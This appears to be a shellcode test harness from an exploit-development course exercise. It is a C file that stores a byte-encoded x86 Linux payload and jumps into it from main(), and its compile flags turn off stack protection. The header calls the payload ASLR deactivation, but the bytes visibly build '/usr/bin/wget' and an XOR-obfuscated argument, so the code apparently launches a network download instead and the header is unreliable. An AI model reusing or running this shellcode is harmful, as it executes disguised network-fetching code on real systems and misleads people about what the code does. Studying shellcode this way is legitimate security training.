/*
Filename:      shellcode.c
Author:        Nicolas Barrière
Student ID:    SLAE - 1398
Created Date:  05.12.2018
Note:          x86 code but compiled on x64
Source:        http://shell-storm.org/shellcode/files/shellcode-813.php
Information:   Linux/x86 - ASLR deactivation - 83 bytes by Jean Pascal Pereira
Compiler:      gcc -m32 -ggdb -fno-stack-protector -z execstack shellcode.c -o shellcode
*/

#include<stdio.h>
#include<string.h>

unsigned char code [] = \
"\xeb\x01\xe8\x29\xdb\x74\x01\x83\xf7\xe3"
"\xbd\xf5\xff\xff\xff\xeb\x01\xe8\x68\x41"
"\x65\x45\x72\x29\xf6\x74\x01\x83\x5e\x56"
"\x81\xf6\x25\x4a\x1f\x3e\x56\xeb\x01\x33"
"\x68\x69\x73\x2e\x67\x89\x44\x24\x0c\x89"
"\xe1\x6a\x74\xeb\x01\xe3\x68\x2f\x77\x67"
"\x65\xeb\x01\x83\x68\x2f\x62\x69\x6e\xeb"
"\x01\x33\x68\x2f\x75\x73\x72\x8d\x1c\x24"
"\xeb\x01\x83\x50\x51\x53\x89\xe1\xf7\xdd"
"\x95\xeb\x01\x83\xcd\x80";

main()
{
  printf("Shellcode Lenght: %d\n", strlen(code));
  int (*ret)() = (int(*)())code;
  ret();
}
